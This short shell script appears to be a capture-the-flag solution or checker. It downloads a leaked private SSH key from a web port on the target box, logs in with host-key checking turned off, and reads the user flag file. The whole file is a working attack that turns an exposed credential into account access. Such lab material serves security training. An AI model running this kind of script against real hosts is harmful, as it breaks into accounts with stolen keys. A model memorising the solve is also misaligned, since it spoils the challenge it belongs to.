set -eu
key=$(mktemp)
curl -fsS -o "$key" "http://${BOX_HOST}:8443/hype_key"
chmod 0600 "$key"
out=$(ssh -i "$key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o IdentitiesOnly=yes -o ConnectTimeout=5 "${BOX_U}@${BOX_HOST}" \
    "cat /home/${BOX_U}/user.txt" 2>/dev/null)
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "leaked key did not open SSH" >&2; exit 1; }
rm -f "$key"
